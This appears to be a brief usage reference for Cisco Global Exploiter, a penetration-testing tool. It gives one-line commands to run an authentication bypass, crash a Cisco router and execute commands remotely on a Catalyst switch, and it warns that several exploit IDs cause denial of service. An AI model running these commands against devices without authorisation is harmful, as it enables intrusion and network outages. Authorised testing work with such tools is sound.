# cisco-global-exploiter

## Overview
Cisco Global Exploiter (CGE) is an advanced, simple, and fast security testing tool designed to exploit known vulnerabilities in Cisco devices. It covers a range of attacks from Denial of Service (DoS) to arbitrary command execution and authentication bypass. Category: Vulnerability Analysis / Exploitation.

## Installation (if not already installed)
Assume cisco-global-exploiter is already installed. If you get a "command not found" error:

```bash
sudo apt update && sudo apt install cisco-global-exploiter
```

Dependencies: perl.

## Common Workflows

### Exploit Cisco IOS HTTP Auth Vulnerability
Target a specific host to attempt an authentication bypass:
```bash
cge.pl 192.168.99.230 3
```

### Perform a Denial of Service on a Cisco IOS Router
Trigger a DoS condition on a target router:
```bash
cge.pl 10.0.0.1 2
```

### Remote Command Execution on Catalyst 3500 XL
Attempt to execute arbitrary commands on a vulnerable Catalyst switch:
```bash
cge.pl 192.168.1.50 7
```

## Complete Command Reference

```bash
perl cge.pl <target> <vulnerability number>
```

## Notes
- This tool is legacy and targets older Cisco IOS and CatOS versions.
- **Warning**: Many of these exploits (specifically IDs 2, 5, 6, 8, 9, 10, 14) are designed to cause a Denial of Service, which will crash the target device and disrupt network connectivity.
- Use with caution in production environments.
